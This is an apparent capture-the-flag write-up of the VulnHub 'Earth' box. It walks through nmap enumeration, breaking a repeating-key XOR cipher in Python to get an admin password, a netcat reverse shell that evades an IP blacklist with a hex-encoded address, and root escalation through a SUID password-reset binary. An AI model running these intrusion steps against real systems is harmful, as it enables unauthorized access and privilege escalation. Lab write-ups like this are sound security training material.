[Earth](https://www.vulnhub.com/entry/the-planets-earth,755/) is an easy [VunlHub](https://www.vulnhub.com/) box by SirFlash.  The major challenges for me were bypassing an IP blacklist for my reverse shell and analyzing a binary to figure out how to properly execute with the necessary triggers were in place.

Once the box is installed on the same network as our attacking box and powered on, we run an nmap scan to find what DHCP address it has been assigned.  Your local subnet mask may vary.  You can check what network your linux box is on by running the command 

```
$ ip a
```

The command

```
$ nmap 192.168.121.0/24
```

uses [CIDR](https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing) notation to search all 255 addresses on the 192.168.121.0 subnet.  In this case, our nmap scan returns the following ports open on our target box:

```
Nmap scan report for 192.168.121.139
Host is up (0.0017s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

However navigating to http://192.168.121.139 (port 80) returns a 400 (Bad Request) error:
![[Pasted image 20211110140804.png]](https://github.com/Eucrates/PenTesting/blob/daeb0824e7a7ed6b776be3f0f8c0714c5de3cb47/Pasted%20image%2020211110140804.png)

![[Pasted image 20211111135448.png]](https://github.com/Eucrates/PenTesting/blob/f5c7a88c675134af708fe088587dc54b7f14e28e/vulnhub/earth/img/Pasted%20image%2020211111135448.png)

and https://192.168.121.139 (port 443) returns a Fedora webserver test page:

![[Pasted image 20211111135638.png]](https://github.com/Eucrates/PenTesting/blob/f5c7a88c675134af708fe088587dc54b7f14e28e/vulnhub/earth/img/Pasted%20image%2020211111135638.png)

We enumerate the websites deeper with a more thorough nmap scan:

```
nmap 192.168.121.139 -A -T4 -p- > nmap
```

-A to enable OS and version detection, script scanning, and  traceroute
-T4 to execute faster (note: in a real world scenario this may be more detectable by an IDS)
-p- to scan all 65535 ports

the bent pipe redirects the output to a file which I named 'nmap'.

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-11 13:58 EST
Nmap scan report for 192.168.121.139
Host is up (0.0011s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Bad Request (400)
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Test Page for the HTTP Server on Fedora
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.60 seconds
```

We see there are two [Subject Alternative Names](https://support.dnsimple.com/articles/what-is-ssl-san/).  Adding the line 

```
192.168.121.139 earth.local terratest.earth.local
```

to the [/etc/hosts](https://www.ibm.com/docs/en/aix/7.2?topic=formats-hosts-file-format-tcpip) file allows us to properly navigate to the pages.  Trying both ports on both earth.local and the terratest.earth.local subdomain, we find three identical pages and one different:

![[Pasted image 20211111143121.png]]

![[Pasted image 20211111141037.png]]

This test site telling us to ignore it makes me want to poke around some more... first we look at the other pages and try a simple message and key to see what the intended output is:

![[Pasted image 20211111142954.png]]

It seems to be encrypting our plaintext message with the key we provide and returning a hexadecimal ciphertext exactly twice as long as our original message.  It's never a good idea to roll your own crypto... there are likely some flaws if this is self-implemented.  Let's play with the interface to see if we can learn anything else about the type of encryption used:

![[Pasted image 20211111143958.png]]

It appears that the algorithm is taking our key, and repeating it across our text, applying some operation, and returning a hexadecimal response.

![[Pasted image 20211111144703.png]]

![[Pasted image 20211111144913.png]]

It's case sensitive.

![[Pasted image 20211111145020.png]]

It appears the algorithm is a simple XOR operation, becasue when you XOR anything against itself, the result is 0.

![[Pasted image 20211111145135.png]]

There doesn't seem to be much else going on, because incremental inputs are incremental outputs.  This appears to be a repeating key XOR cipher which are [breakable](https://arpitbhayani.me/blogs/decipher-repeated-key-xor).  But since we can create messages with known input and keys, lets see if we can recreate the algorithm to look for further flaws.

With a little [help](https://www.kite.com/python/answers/how-to-take-the-bitwise-xor-of-two-strings-in-python) we can repeat the algorithm.

```
plaintext = 'AAAAAAAAAA'
key = 'key'

# create repeating key the same length as the plaintext
repkey = ''
n = 0
for t in range(len(plaintext)):
    repkey = repkey + key[n]
    if n < len(key) - 1:
        n+=1
    else:
        n=0

# https://www.kite.com/python/answers/how-to-take-the-bitwise-xor-of-two-strings-in-python
cipherlist = [hex(ord(a)^ord(b)).strip('0x') for a,b in zip(plaintext,repkey)]
ciphertext = "".join(cipherlist)

print('plaintext = ' + plaintext)
print('repeating key = ' + repkey)
print('ciphertext = ' + ciphertext)

```

Now the beautiful part about a simple XOR cipher is if we have both the plaintext and the cipher text, we can find the key!  Adding the following code reverses the key out of the ciphertext by xoring it with the plaintext:

```
#turn ciphertext hexidecimal into a character string
cipherstring=(ciphertext.decode('hex'))

#xor plaintext with cipher text to get key
plainxorcipherlist = [hex(ord(a)^ord(b)) for a,b in zip(plaintext,cipherstring)]

revkey = ''
for i in plainxorcipherlist:
    revkey=revkey+(chr(int(i,16)))
```

Now, if only we had some plaintext to compare to the original cipher text strings on the site.

I looked at [robots.txt](https://en.wikipedia.org/wiki/Robots_exclusion_standard) for each of the four sites (http://earth.local, https://earth.local, http://terratest.earth.local and https://terratest.earth.local) and found an interesting one at the secure terratest site:

![[Pasted image 20211111170336.png]]

robots.txt files are like the Pirate Code- more guidelines than anything.  They prevent well-behaved webcrawlers from indexing given pages on a website so they don't show up in search results.  Thus, ironically, they can often hint to pages that the owners would prefer to remain hidden.  For example, the filename testingnotes with any extension is disallowed.  Let's see if we can guess an extension:

![[Pasted image 20211111170448.png]]

Never a good idea to leave notes on a webpage...

XOR was used in the algorithm, as we already determined through trial and error.   RSA does use XOR in its algorithm, but it's more complicated than the one used here.  For one thing, RSA uses aysmetric encryption which uses a different private key to decrypt what has been encrypted with a public key.  The algorithm used here uses a symmetric key, meaning the same key is used to encrypt and decrypt.  Testdata.txt was used to test the encryption.  There's an admin portal (directory busting is our next step anyway, but now we know we're looking for one) and we have a username.  The key may be vulnerable to bruteforce, but we already have a reversing program to figure it out if we can find the right plaintext.

navigating to /testdata.txt reveals the message:

```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

Maybe this is a plaintext message used?  There are three sentences and three original ciphers on the page.  Let's see if we can suss out a key from any of them.   Also noteworthy, the word billion is repeated three times.  A [repeated phrase can also be used to crack encryption](https://www.scienceabc.com/innovation/cracking-the-uncrackable-how-did-alan-turing-and-his-team-crack-the-enigma-code.html#how-did-this-flaw-help-crack-the-enigma-code).  

The first thing I checked was the length of the ciphertexts and the test text- because the algorithm takes an ASCII plaintext string and returns the ciphertext in hexidecimal, it will be exactly twice as long as our plaintext (two hexidecimal characters for every one ASCII).  And the bottom cipher was 806 characters long, while our test text was 403.  Let's try to reverse a key!

Slightly adjusting our code from above:

```
plaintext1 = 'AAAAAAAAAA'
plaintext2 = "According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago."


key1 = 'key'
key2 = 'earthclimatechangebad4humans'

cipher1 = '37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40'
cipher2 = '3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45'
cipher3 = '2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a'

# create repeating key the same length as plaintext
def repeatkey(plaintext,key):
    repkey = ''
    n = 0
    for t in range(len(plaintext)):
        repkey = repkey + key[n]
        if n < len(key) - 1:
            n+=1
        else:
            n=0
    return (repkey)

# adapted from https://www.kite.com/python/answers/how-to-take-the-bitwise-xor-of-two-strings-in-python
#return cipher text from plaintext and key
def cipher (plaintext,repkey):
    cipherlist = []
    for i in range (len(plaintext)):
        val =((ord(plaintext[i])^ord(repkey[i])))
        cipherlist.append( ("{0:0{1}x}".format(val,2)))
    ciphertext = "".join(cipherlist)
    return (ciphertext)

#turn ciphertext hexidecimal into a character string
def cipherstr (cipher):
    cipherstring=(cipher.decode('hex'))
    return (cipherstring)

#xor text1 with text2, return as list of hex strings
def xor (text1,text2):
    return( [hex(ord(a)^ord(b)) for a,b in zip(text1,text2)] )

# turns list of hex strings into string
def revkey(result):
    rev = ''
    for i in result:
        rev=rev+(chr(int(i,16)))
    return (rev)


result = xor(plaintext2,cipherstr(cipher3))
rev = revkey(result)

print(rev)

```

```
$ python messeger.py                                                                                                                      
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

As suspected, we found a repeating key: "earthclimatechangebad4humans".

I tried using this key to decode the other ciphers on the page, but had no luck.

Turning back to the website, we were told there's an admin page, and that a number of file types were disallowed from search engines.

Going whole hog, we can use gobuster to search for all the extensions

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -u https://earth.local -x asp,aspx,bat,c,cfm,cgi,com,dll,exe,htl,html,inc,jhtml,jsa,json,jsp,log,mdb,nsf,php,phtml,pl,reg,sh,shtml,sql,txt,xml
```

This was over kill and the only thing we turned up was the suspected admin page.  

![[Pasted image 20211111213216.png]]

We try logging in using the username we discovered above and the key we discovered in the previous as the password step and it works!

![[Pasted image 20211113145920.png]]

![[Pasted image 20211111213554.png]]

We are able to run simple commands on the box.  It's generally a good idea to check the webroot for configuration information and other goodies.  Usually this is somewhere in /var on linux.  Here we find a folder in called /var/ called earth_web which is unusual.  Listing that find the user flag and can cat it out.  

![[Pasted image 20211112064612.png]]

Unfortunately when we try to run a reverse shell, we get a message saying we can't make remote connections.

![[Pasted image 20211111220334.png]]

There's a database in the /var/earth_web folder that we can dump with the command

```
sqlite3 /var/earth_web/db.sqlite3 .dump
```

But I couldn't see anything significant in there.  

I found the actual webroot at /var/www/html/terratest.earth.local and found the files we found previously, but could not write to it, so I couldn't try loading a reverse shell there.

After a lot of searching I tried the phrase "local IP blacklist bypass" and came across [this issue](https://github.com/yanc0/beeping/issues/20) where changing the IP address to a hexidecimal number allowed the user to bypass the IP restriction.  

I gave it a go with 

```
nc -e /bin/bash 0xc0a87988 443`
```

and it worked!  We got a shell as "apache".

![[Pasted image 20211113113328.png]]

Now we can dig around much easier.

I tried 

```
sudo -l
```
To see if we had any special permissions, but it required a password.  earthclimatechangebad4humans didn't work.

I looked for ssh files:

```
find -name .ssh 2>/dev/null
```
but had no luck.

Then I looked for files with the [suid](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/) bit set:

```
-rwsr-xr-x. 1 root root 74208 Aug  9 08:21 /usr/bin/chage
-rwsr-xr-x. 1 root root 78536 Aug  9 08:21 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 42256 Aug  9 08:21 /usr/bin/newgrp
-rwsr-xr-x. 1 root root 58384 Feb 12  2021 /usr/bin/su
-rwsr-xr-x. 1 root root 49920 Feb 12  2021 /usr/bin/mount
-rwsr-xr-x. 1 root root 37560 Feb 12  2021 /usr/bin/umount
-rwsr-xr-x. 1 root root 32648 Jun  3 12:29 /usr/bin/pkexec
-rwsr-xr-x. 1 root root 32712 Jan 30  2021 /usr/bin/passwd
-rws--x--x. 1 root root 33488 Feb 12  2021 /usr/bin/chfn
-rws--x--x. 1 root root 25264 Feb 12  2021 /usr/bin/chsh
-rwsr-xr-x. 1 root root 57432 Jan 26  2021 /usr/bin/at
---s--x--x. 1 root root 185504 Jan 26  2021 /usr/bin/sudo
-rwsr-xr-x. 1 root root 24552 Oct 12 22:18 /usr/bin/reset_root
-rwsr-xr-x. 1 root root 15632 Sep 29 18:48 /usr/sbin/grub2-set-bootflag
-rwsr-xr-x. 1 root root 16096 Jun 10 19:22 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 24552 Jun 10 19:22 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 116064 Sep 23 18:06 /usr/sbin/mount.nfs
-rwsr-xr-x. 1 root root 24536 Jun  3 12:29 /usr/lib/polkit-1/polkit-agent-helper-1
```

reset_root looks interesting.  Its an ELF file and running it give the output 

```
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```

I wanted to take a closer look to see if I could determine the triggers.  I successfully opened a webserver, but kept getting a "connection refused" message when trying to wget from my attacking machine.  I wonder if this had to do with the remote connection restriction.  

I transferred the file with netcat, readying my listner:

```
$ nc -l 444 > reset_root
```

and transferring it from the host with 

```
$ nc 192.168.121.136 444 < /usr/bin/reset_root
```

Taking a look with [strings](https://linux.die.net/man/1/strings)

```
$ strings reset_root
<snip>
credentiH
als rootH
:theEartH
hisflat
[]A\A]A^A_
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
;*3$"
GCC: (GNU) 11.1.1 20210531 (Red Hat 11.1.1-3)
GCC: (GNU) 11.2.1 20210728 (Red Hat 11.2.1-1)
3g979
running gcc 11.1.1 20210531
annobin gcc 11.1.1 20210531
GA*GOW
GA+stack_clash
<snip>
```

It appears that if the triggers are present, the program resets the root password to 'Earth'.

Now we need to figure out what the triggers are.  Maybe [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html) will give us some information:

```
$ ltrace ./reset_root
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                             = 38
access("/dev/shm/kHgTFI5G", 0)                                                                          = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                          = -1
access("/tmp/kcM0Wewe", 0)                                                                              = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                             = 44
+++ exited (status 0) +++
```

It seems to be looking for several temporary files with the [access](https://linux.die.net/man/2/access) function.  But the man page doesn't address a 0 value for the second parameter, so I'm not sure what mode it's looking for.  The man page says this value should be F_OK to check whether the file exists, or R_OK, W_OK, X_OK, for read, write and execute permissions, respectively.  The header file where these constant ints are defined is unistd.h.
```
$ cat /usr/include/unistd.h | grep 0   
<snip>
# define _XOPEN_VERSION 500
#define STDIN_FILENO    0       /* Standard input.  */
#define F_OK    0               /* Test for existence.  */
# define SEEK_SET       0       /* Seek from beginning of file.  */
<snip>
```

So  F_OK has a value of 0.  It's simply looking for the existence of these files.  Lets see what happens when we create them on our target machine:

```
bash-5.1$ touch /dev/shm/kHgTFI5G
bash-5.1$ touch /dev/shm/Zw7bV9U5
bash-5.1$ touch /tmp/kcM0Wewe
bash-5.1$ /usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
bash-5.1$  su root
Earth

[root@earth /]# whoami
root
[root@earth /]# cd /root
[root@earth /]# cat root_flag.txt

              _-o#&&*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&&HMMMMMMMMMM?.
    ,'              $M&ood,~'`(&##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM}       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &M}                     `          .-
      `&.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29d<snip>
```

Rooted!
